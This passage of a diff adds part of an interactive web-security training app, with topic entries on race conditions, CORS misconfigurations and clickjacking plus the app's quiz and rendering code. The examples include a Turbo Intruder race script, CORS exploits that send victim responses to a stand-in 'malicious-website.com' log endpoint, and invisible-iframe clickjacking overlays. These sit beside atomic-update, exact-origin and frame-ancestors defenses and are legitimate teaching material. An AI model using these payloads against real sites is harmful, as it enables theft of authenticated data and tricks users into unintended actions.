+  short:'Exploit concurrent processing to exceed limits or hit hidden states.',
+  severity:'medium', sevColor:'#ffd60a',
+  tags:['TOCTOU','Limit overrun','Single-packet','Atomicity'],
+  desc:"Race conditions occur when requests are processed concurrently without safeguards. Carefully timed requests collide inside a 'race window' and cause behaviour the developers never intended.",
+  flow:[{t:"Request 1: code unused ✓",c:'fn-s'},{t:"→"},{t:"Request 2: code unused ✓",c:'fn-s'},{t:"→"},{t:"Both apply discount",c:'fn-x'},{t:"→"},{t:"Code marked used (too late)",c:'fn-i'}],
+  howItWorks:"A request can push the application through temporary sub-states. In a promo code flow: check unused, apply discount, mark used. Parallel requests that all pass the first check before the last step completes each get the discount. The single-packet attack (HTTP/2) removes network jitter by delivering 20-30 requests in one TCP packet.",
+  types:[
+    {name:"Limit overrun (TOCTOU)",desc:"Reuse gift cards, rate limits, ratings, withdrawals beyond the allowed limit.",c:'#ffd60a'},
+    {name:"Multi-endpoint",desc:"Payment validation vs basket changes racing across endpoints.",c:'#ff9500'},
+    {name:"Single-endpoint",desc:"Parallel requests with different values collide on session or record state.",c:'#ff6b6b'},
+    {name:"Partial construction",desc:"Object exists briefly with uninitialized fields (e.g. API key null).",c:'#a855f7'},
+    {name:"Time-sensitive tokens",desc:"Timestamp-seeded tokens collide when requests are timed together.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Method: predict, probe, prove",kind:"atk",lang:"Text",code:`1. PREDICT  security-critical endpoint? two requests touching the same record?
+2. PROBE    benchmark: send group in sequence (separate connections)
+            then: send group in parallel (single-packet attack, or
+            last-byte sync on HTTP/1) and look for ANY deviation
+3. PROVE    remove superfluous requests, confirm it still reproduces
+
+Burp Repeater: group tabs -> "Send group in parallel"`},
+    {title:"Turbo Intruder single-packet script",kind:"atk",lang:"Python",code:`def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    for i in range(20):
+        engine.queue(target.req, gate='1')
+    engine.openGate('1')   # all 20 leave in one TCP packet`},
+    {title:"Atomic fix",kind:"good",lang:"SQL",code:`-- VULNERABLE: check, then update (race window in between)
+SELECT used FROM codes WHERE code = 'SAVE20';
+UPDATE codes SET used = 1 WHERE code = 'SAVE20';
+
+-- SAFE: one atomic conditional update; only one request wins
+UPDATE codes SET used = 1 WHERE code = 'SAVE20' AND used = 0;
+-- rows affected = 0  => already used, reject`}
+  ],
+  prevention:["Make sensitive state changes atomic using a single database transaction","Use datastore integrity features such as unique constraints","Don't use one storage layer (e.g. sessions) to protect another (database)","Keep sessions internally consistent; avoid updating variables one by one","Consider client-side state with signed tokens where appropriate"],
+  quiz:[
+    {q:"What is the race window?",opts:["Page render time","The period during which a collision between requests is possible","Session timeout","Cache TTL"],ans:1,exp:"It can be milliseconds, such as the gap between checking and updating a record."},
+    {q:"What does the single-packet attack do?",opts:["Sends one huge request","Completes many parallel requests in one TCP packet to neutralize jitter","Disables TLS","Floods the server"],ans:1,exp:"Used over HTTP/2, it makes requests arrive essentially simultaneously."},
+    {q:"Best fix for a limit overrun?",opts:["More logging","Atomic check-and-update in one operation","Sleep between steps","Larger rate limits"],ans:1,exp:"Eliminating the sub-state removes the window entirely."},
+    {q:"Why might requests appear to be processed sequentially?",opts:["HTTP/3","Session-based locking, e.g. PHP's session handler","Caching","CORS"],ans:1,exp:"Try a different session token for each request."}
+  ],
+  refs:[
+    {src:"PortSwigger",name:"Smashing the state machine (research)",url:"https://portswigger.net/research/smashing-the-state-machine"},
+    {src:"OWASP",name:"Race conditions",url:"https://owasp.org/www-community/vulnerabilities/Race_Conditions"}
+  ]
+},
+{
+  id:'cors', icon:'🌐', name:'CORS Misconfigurations', group:'client',
+  short:'Exploit overly permissive cross-origin resource sharing.',
+  severity:'high', sevColor:'#ff9500',
+  tags:['CORS','Origin reflection','Credentials','null origin'],
+  desc:"CORS relaxes the same-origin policy in a controlled way. Poorly configured policies let malicious sites read authenticated responses, including API keys and CSRF tokens.",
+  flow:[{t:"evil.com script",c:'fn-a'},{t:"→"},{t:"XHR withCredentials",c:'fn-v'},{t:"→"},{t:"Server reflects Origin",c:'fn-x'},{t:"→"},{t:"Response readable cross-origin",c:'fn-i'}],
+  howItWorks:"Servers allow origins via Access-Control-Allow-Origin, and cookies via Access-Control-Allow-Credentials: true. If the origin is reflected blindly, parsed incorrectly, or null is trusted, any attacker page can make in-session requests and read the results.",
+  types:[
+    {name:"Origin reflection",desc:"ACAO echoes the request's Origin with credentials allowed.",c:'#ff4d4d'},
+    {name:"Origin parsing errors",desc:"Suffix/prefix/regex mistakes: hackersnormal-website.com, normal-website.com.evil-user.net.",c:'#ff9500'},
+    {name:"Whitelisted null",desc:"Sandboxed iframes and data: URLs send Origin: null.",c:'#ffd60a'},
+    {name:"Trusted XSS-able or HTTP origin",desc:"XSS on a trusted subdomain, or MITM via a plain-HTTP trusted origin.",c:'#a855f7'},
+    {name:"Intranet without credentials",desc:"ACAO: * on internal sites reachable via victim's browser.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Origin reflection exploit",kind:"atk",lang:"JavaScript",code:`var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+  location = '//malicious-website.com/log?key=' + this.responseText;
+}`},
+    {title:"Trusted null origin",kind:"atk",lang:"HTML",code:`<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = function(){ location='//malicious-website.com/log?key='+this.responseText };
+    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+    req.withCredentials = true;
+    req.send();
+  <\/script>"></iframe>`},
+    {title:"Safe configuration",kind:"good",lang:"Python",code:`ALLOWED = {"https://app.example.com", "https://admin.example.com"}
+origin = request.headers.get("Origin", "")
+if origin in ALLOWED:                       # exact match, never endswith()
+    resp.headers["Access-Control-Allow-Origin"] = origin
+    resp.headers["Access-Control-Allow-Credentials"] = "true"
+    resp.headers["Vary"] = "Origin"
+# otherwise: send no CORS headers at all`}
+  ],
+  prevention:["Only allow explicitly trusted origins using exact matching","Never reflect arbitrary origins and never whitelist null","Avoid wildcards on internal networks","CORS is not a substitute for server-side authentication and session management"],
+  quiz:[
+    {q:"Which combination is most dangerous?",opts:["ACAO: * alone","Reflected Origin + Allow-Credentials: true","Same-origin only","No CORS headers"],ans:1,exp:"Any site can then read in-session responses."},
+    {q:"Why is whitelisting null dangerous?",opts:["null is slow","Attackers can generate Origin: null with sandboxed iframes","null is encrypted","Browsers ignore it"],ans:1,exp:"A sandboxed iframe or data: URL request sends Origin: null."},
+    {q:"What is wrong with allowing any domain ending in normal-website.com?",opts:["Nothing","An attacker can register hackersnormal-website.com","It breaks HTTPS","It disables cookies"],ans:1,exp:"Suffix matching accepts unintended domains."},
+    {q:"Does CORS protect against CSRF?",opts:["Yes fully","No, it's not a protection against cross-origin attacks such as CSRF","Only on GET","Only with cookies"],ans:1,exp:"CORS controls reading responses, not whether requests are sent."}
+  ],
+  refs:[
+    {src:"MDN",name:"Cross-Origin Resource Sharing (CORS)",url:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"},
+    {src:"PortSwigger",name:"Exploiting CORS misconfigurations (research)",url:"https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"}
+  ]
+},
+{
+  id:'clickjacking', icon:'🖱️', name:'Clickjacking', group:'client',
+  short:'Overlay invisible frames so users click the wrong thing.',
+  severity:'medium', sevColor:'#ffd60a',
+  tags:['UI redressing','iframe','Frame-ancestors','X-Frame-Options'],
+  desc:"Clickjacking tricks a user into clicking actionable content on a hidden website while they believe they're clicking a decoy page. CSRF tokens don't help because the action occurs on the genuine site.",
+  flow:[{t:"Decoy page",c:'fn-s'},{t:"→"},{t:"Transparent iframe on top",c:'fn-v'},{t:"→"},{t:"Victim clicks 'prize'",c:'fn-x'},{t:"→"},{t:"Real button clicked",c:'fn-i'}],
+  howItWorks:"The attacker layers the target in an iframe using CSS (opacity near 0, z-index above the decoy) so the target's button lines up with the decoy button. Variants prefill form inputs from URL parameters, defeat frame busters with the sandbox attribute, carry a DOM XSS payload, or chain several clicks.",
+  types:[
+    {name:"Basic with CSRF token present",desc:"Token is valid because the request comes from the real site inside the frame.",c:'#ffd60a'},
+    {name:"Prefilled form input",desc:"GET parameters populate fields before the victim clicks submit.",c:'#ff9500'},
+    {name:"Frame buster bypass",desc:'<iframe sandbox="allow-forms"> neutralizes frame busting scripts.',c:'#a855f7'},
+    {name:"Clickjacking + DOM XSS",desc:"The click delivers a DOM XSS payload.",c:'#ff4d4d'},
+    {name:"Multistep",desc:"Several decoy elements guide multiple clicks.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Basic overlay",kind:"atk",lang:"HTML",code:`<style>
+  #target_website { position:relative; width:128px; height:128px;
+                    opacity:0.00001; z-index:2; }
+  #decoy_website  { position:absolute; width:300px; height:400px; z-index:1; }
+</style>
+<div id="decoy_website">...decoy content...</div>
+<iframe id="target_website" src="https://vulnerable-website.com"></iframe>`},
+    {title:"Neutralizing a frame buster",kind:"atk",lang:"HTML",code:`<iframe id="victim_website" src="https://victim-website.com"
+        sandbox="allow-forms"></iframe>
+<\!-- allow-top-navigation is omitted, so the frame can't break out -->`},
+    {title:"Server-side defenses",kind:"good",lang:"HTTP",code:`X-Frame-Options: deny
+X-Frame-Options: sameorigin
+
+Content-Security-Policy: frame-ancestors 'none';
+Content-Security-Policy: frame-ancestors 'self';
+Content-Security-Policy: frame-ancestors normal-website.com;`}
+  ],
+  prevention:["Send Content-Security-Policy: frame-ancestors (preferred) and/or X-Frame-Options","Don't rely on JavaScript frame busters","Require explicit confirmation for sensitive actions","Use CSP carefully as part of a multi-layer defense"],
+  quiz:[
+    {q:"Why don't CSRF tokens stop clickjacking?",opts:["They do","The request is made on-domain, inside the frame, with a valid token","Tokens only protect GET","Clickjacking ignores cookies"],ans:1,exp:"The victim genuinely interacts with the real site; only framing restrictions help."},
+    {q:"Which CSS makes the iframe invisible but clickable?",opts:["display:none","visibility:hidden","opacity near 0","z-index:-1"],ans:2,exp:"Near-zero opacity keeps the element interactive."},
+    {q:"What is the recommended modern defense?",opts:["Frame busting JS","CSP frame-ancestors","robots.txt","Cookie flags"],ans:1,exp:"Server-driven headers are enforced by the browser; X-Frame-Options is the older alternative."},
+    {q:"Why do frame busters fail?",opts:["They are slow","Attackers can use the iframe sandbox attribute to disable top navigation","Browsers don't support JS","They need cookies"],ans:1,exp:"Omitting allow-top-navigation leaves the script unable to check or break out of the frame."}
+  ],
+  refs:[
+    {src:"OWASP",name:"Clickjacking Defense Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"},
+    {src:"MDN",name:"X-Frame-Options",url:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"}
+  ]
+}
+];
+/* ---------- state ---------- */
+let currentId = null;
+let filterGroup = 'all';
+const quizState = {};
+function qState(id){ if(!quizState[id]) quizState[id]={q:0,score:0,answered:false}; return quizState[id]; }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+/* ---------- sidebar / index ---------- */
+function buildSidebar(){
+  const groups=[{label:'server-side',key:'server'},{label:'client-side',key:'client'},{label:'auth & logic',key:'auth'}];
+  let html='';
+  groups.forEach(g=>{
+    html+='<div class="sb-section"><span class="sb-label">'+g.label+'</span>';
+    TOPICS.filter(x=>x.group===g.key).forEach(t=>{
+      html+='<button class="sb-item" id="sb-'+t.id+'" onclick="openTopic(\''+t.id+'\')"><span class="si">'+t.icon+'</span><span class="sname">'+t.name+'</span><span class="sb-sev sev-'+t.severity+'">'+t.severity+'</span></button>';
+    });
+    html+='</div>';
+  });
+  document.getElementById('sidebar').innerHTML=html;
+}
+function buildIndex(){
+  const rows=TOPICS.filter(t=>filterGroup==='all'||t.group===filterGroup);
+  document.getElementById('topic-tbody').innerHTML=rows.map(t=>
+    '<tr onclick="openTopic(\''+t.id+'\')"><td class="tt-icon">'+t.icon+'</td><td><span class="tt-name">'+t.name+'</span><span class="tt-desc">'+t.short+'</span></td><td><div class="tt-tags">'+t.tags.slice(0,3).map(x=>'<span class="tag-pill">'+x+'</span>').join('')+'</div></td><td><span class="sb-sev sev-'+t.severity+'">'+t.severity+'</span></td><td class="tt-arrow">&rsaquo;</td></tr>'
+  ).join('');
+}
+function setFilter(g){
+  filterGroup=g;
+  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+  document.getElementById('filter-'+g).classList.add('active');
+  buildIndex();
+  showIndex();
+}
+function showIndex(){
+  currentId=null;
+  document.getElementById('index-view').classList.remove('off');
+  document.getElementById('detail-view').classList.remove('on');
+  document.querySelectorAll('.sb-item').forEach(el=>el.classList.remove('active'));
+  document.getElementById('main').scrollTop=0;
+}
+
+/* ---------- topic view ---------- */
+function openTopic(id){
+  const t=TOPICS.find(x=>x.id===id); if(!t) return;
+  currentId=id;
+  document.querySelectorAll('.sb-item').forEach(el=>el.classList.remove('active'));
+  const sb=document.getElementById('sb-'+id); if(sb) sb.classList.add('active');
+  document.getElementById('index-view').classList.add('off');
+  document.getElementById('detail-view').classList.add('on');
+  document.getElementById('det-head').innerHTML=
+    '<button class="back-btn" onclick="showIndex()">&larr; index</button>'+
+    '<div class="det-icon-wrap">'+t.icon+'</div>'+
+    '<div class="det-meta"><h1>'+t.name+'</h1><p class="ddesc">'+t.desc+'</p><div class="det-badges"><span class="badge sev-'+t.severity+'">'+t.severity+'</span>'+
+    t.tags.map(x=>'<span class="badge" style="border-color:'+t.sevColor+'40;color:'+t.sevColor+';background:'+t.sevColor+'12">'+x+'</span>').join('')+'</div></div>';
+  const tabs=[['overview','Overview'],['examples','Examples'],['types','Types'],['defense','Defense'],['quiz','Quiz'],['refs','References']];
+  document.getElementById('tab-bar').innerHTML=tabs.map((tb,i)=>'<button class="tab-btn'+(i===0?' on':'')+'" id="tbtn-'+tb[0]+'" onclick="switchTab(\''+id+'\',\''+tb[0]+'\')">'+tb[1]+'</button>').join('');
+  renderTab(id,'overview');
+  document.getElementById('main').scrollTop=0;
+  window.scrollTo(0,0);
+}
+function switchTab(id,key){
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('on'));
+  document.getElementById('tbtn-'+key).classList.add('on');
+  renderTab(id,key);
+}
+function renderTab(id,key){
+  const t=TOPICS.find(x=>x.id===id), tc=document.getElementById('tab-content');
+  let h='';
+  if(key==='overview'){
+    const sevMsg=t.severity==='critical'?'Can lead to full system or data compromise.':t.severity==='high'?'Significant data or account impact.':'Impact depends heavily on the application and chaining with other flaws.';
+    h='<p class="sec-title">How it works</p><p class="prose-p">'+t.howItWorks+'</p>'+
+      '<div class="flow-wrap"><div class="flow-title">attack flow</div><div class="flow-nodes">'+
+      t.flow.map(n=>n.t==='→'?'<span class="fn-arrow">&rarr;</span>':'<span class="fn '+n.c+'">'+esc(n.t)+'</span>').join('')+'</div></div>'+
+      '<div class="callout callout-warn"><span class="callout-icon">!</span><span>Severity: <strong>'+t.severity+'</strong>. '+sevMsg+'</span></div>';
+  } else if(key==='examples'){
+    h='<p class="sec-title">Attack and defense examples</p>'+
+      '<div class="callout callout-red"><span class="callout-icon">!</span><span>For education only. Test just on systems you own or have explicit permission to test, such as the free PortSwigger labs.</span></div>'+
+      t.examples.map(ex=>'<div class="ex-block"><div class="ex-title">'+ex.title+'</div><div class="code-wrap"><div class="code-header"><span class="code-lang '+(ex.kind==='good'?'code-label-good':'code-label-atk')+'">'+(ex.kind==='good'?'secure':'payload')+' / '+ex.lang+'</span><button class="copy-code-btn" onclick="copyCode(this)">copy</button></div><div class="code-body"><pre>'+esc(ex.code)+'</pre></div></div></div>').join('');
+  } else if(key==='types'){
+    h='<p class="sec-title">Variants</p><div class="types-list">'+t.types.map(ty=>'<div class="type-row" style="border-left-color:'+ty.c+'"><div class="tr-name">'+ty.name+'</div><div class="tr-desc">'+ty.desc+'</div></div>').join('')+'</div>';
+  } else if(key==='defense'){
+    h='<p class="sec-title">How to prevent</p><div class="callout callout-tip"><span class="callout-icon">&#10003;</span><span>Use defense in depth: no single control is enough.</span></div><div class="checklist">'+t.prevention.map(p=>'<div class="cl-item"><span class="ci">&#10003;</span><span>'+p+'</span></div>').join('')+'</div>';
+  } else if(key==='quiz'){
+    renderQuiz(id); return;
+  } else if(key==='refs'){
+    h='<p class="sec-title">References and further reading</p>'+
+      '<div class="callout callout-info"><span class="callout-icon">&#8599;</span><span>Practice on free, deliberately vulnerable labs at <a href="https://portswigger.net/web-security/all-topics" target="_blank" rel="noopener">PortSwigger Web Security Academy</a>.</span></div><div class="divider"></div><div class="refs-grid">'+
+      t.refs.concat([
+        {src:'PortSwigger',name:'All topics and free labs',url:'https://portswigger.net/web-security/all-topics'},
+        {src:'OWASP',name:'OWASP Top 10',url:'https://owasp.org/www-project-top-ten/'},
+        {src:'HackTricks',name:'Pentesting web book',url:'https://book.hacktricks.xyz/'}
+      ]).map(r=>{let host='';try{host=new URL(r.url).hostname}catch(e){}return '<a class="ref-card" href="'+r.url+'" target="_blank" rel="noopener"><div class="ref-src">'+r.src+'</div><div class="ref-name">'+r.name+'</div><div class="ref-url">&#8599; '+host+'</div></a>';}).join('')+'</div>';
+  }
+  tc.innerHTML='<div class="tab-pane">'+h+'</div>';
+}
+
+/* ---------- quiz ---------- */
+function renderQuiz(id){
+  const t=TOPICS.find(x=>x.id===id), st=qState(id), tc=document.getElementById('tab-content');
+  if(st.q>=t.quiz.length){
+    const pct=Math.round(st.score/t.quiz.length*100);
+    const grade=pct>=80?'Solid.':pct>=60?'Getting there.':'Review the material and try again.';
+    tc.innerHTML='<div class="tab-pane"><div class="quiz-wrap"><div class="quiz-end"><div class="big-score">'+pct+'%</div><div class="score-sub">'+st.score+' / '+t.quiz.length+' correct. '+grade+'</div><button class="retry-btn" onclick="resetQuiz(\''+id+'\')">retry quiz</button></div></div></div>';
+    return;
+  }
+  const q=t.quiz[st.q], pct=st.q/t.quiz.length*100;
+  tc.innerHTML='<div class="tab-pane"><div class="quiz-wrap"><div class="quiz-prog-bar-outer"><div class="quiz-prog-bar-inner" style="width:'+pct+'%"></div></div>'+
+    '<div class="quiz-scoreline">Question '+(st.q+1)+' of '+t.quiz.length+' &middot; Score: '+st.score+'</div><div class="quiz-q">'+q.q+'</div><div class="quiz-opts">'+
+    q.opts.map((o,i)=>'<button class="quiz-opt" onclick="answerQ(\''+id+'\','+i+')">'+esc(o)+'</button>').join('')+
+    '</div><div class="quiz-exp" id="qexp"></div><div class="quiz-footer"><button class="quiz-next-btn" id="qnext" onclick="nextQ(\''+id+'\')">'+(st.q+1===t.quiz.length?'See results':'Next question')+'</button></div></div></div>';
+}
+function answerQ(id,idx){
+  const st=qState(id); if(st.answered) return; st.answered=true;
+  const q=TOPICS.find(x=>x.id===id).quiz[st.q];
+  const ok=idx===q.ans; if(ok) st.score++;
+  document.querySelectorAll('.quiz-opt').forEach((b,i)=>{ b.disabled=true; if(i===q.ans) b.classList.add('correct'); else if(i===idx) b.classList.add('wrong'); });
+  const exp=document.getElementById('qexp');
+  exp.className='quiz-exp show '+(ok?'correct':'wrong');
+  exp.innerHTML='<strong>'+(ok?'Correct.':'Not quite.')+'</strong> '+q.exp;
+  document.getElementById('qnext').classList.add('show');
+}
+function nextQ(id){ const st=qState(id); st.q++; st.answered=false; renderQuiz(id); }
+function resetQuiz(id){ quizState[id]={q:0,score:0,answered:false}; renderQuiz(id); }
+
+/* ---------- search ---------- */
+function setupSearch(){
+  const inp=document.getElementById('searchInp'), drop=document.getElementById('search-drop');
+  inp.addEventListener('input',()=>{
+    const q=inp.value.toLowerCase().trim();
+    if(!q){ drop.classList.remove('open'); return; }
+    const hits=TOPICS.filter(t=>t.name.toLowerCase().includes(q)||t.short.toLowerCase().includes(q)||t.tags.some(x=>x.toLowerCase().includes(q))||t.types.some(x=>x.name.toLowerCase().includes(q)||x.desc.toLowerCase().includes(q))).slice(0,7);
+    if(!hits.length){ drop.innerHTML='<div class="sdrop-item"><div class="si-desc">No matches</div></div>'; drop.classList.add('open'); return; }
+    drop.innerHTML=hits.map(t=>'<div class="sdrop-item" onclick="selectSearch(\''+t.id+'\')"><span class="si-icon">'+t.icon+'</span><div><div class="si-name">'+t.name+'</div><div class="si-desc">'+t.short.substring(0,64)+'</div></div></div>').join('');
+    drop.classList.add('open');
+  });
+  document.addEventListener('click',e=>{ if(!e.target.closest('.search-box')) drop.classList.remove('open'); });
+}
+function selectSearch(id){ document.getElementById('searchInp').value=''; document.getElementById('search-drop').classList.remove('open'); openTopic(id); }
+
+/* ---------- utils ---------- */
+function copyCode(btn){
+  const text=btn.closest('.code-wrap').querySelector('pre').innerText;
+  const done=()=>{ btn.textContent='copied'; setTimeout(()=>btn.textContent='copy',1500); };
+  try{ navigator.clipboard.writeText(text).then(done,done); }catch(e){ done(); }
+}
+
+/* ---------- init ---------- */
+(function init(){
+  document.getElementById('n-topics').textContent=TOPICS.length;
+  document.getElementById('n-crit').textContent=TOPICS.filter(t=>t.severity==='critical').length;
+  document.getElementById('n-ex').textContent=TOPICS.reduce((a,t)=>a+t.examples.length,0);
+  document.getElementById('n-q').textContent=TOPICS.reduce((a,t)=>a+t.quiz.length,0);
+  buildSidebar(); buildIndex(); setupSearch();
+  document.getElementById('filter-all').classList.add('active');
+})();
+</script>
+</body>
+</html>
